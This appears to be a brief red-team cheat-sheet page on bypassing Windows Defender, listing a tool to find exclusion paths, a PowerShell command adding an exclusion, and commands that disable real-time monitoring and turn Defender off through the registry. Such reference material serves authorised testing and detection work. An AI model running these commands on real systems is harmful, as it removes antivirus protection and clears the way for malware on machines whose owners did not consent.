---
title: "Windows Defender"
date: 2025-7-24
tags: ["Bypass", "Defender", "AV", "Anti-Virus", "Windows"]
---

### Check Exclusion Path

```console
.\SharpExclusionFinder.exe '<PATH>'
```

<small>*Ref: [SharpExclusionFinder](https://github.com/Friends-Security/SharpExclusionFinder)*</small>

### Add Exclusion Path

```console
Add-MpPreference -ExclusionPath '<PATH>'
```

### Disable Defender

{{< tab set1 tab1 >}}powershell{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Disable realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true
```

```console
# Completely disable defender
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
```

{{< /tabcontent >}}
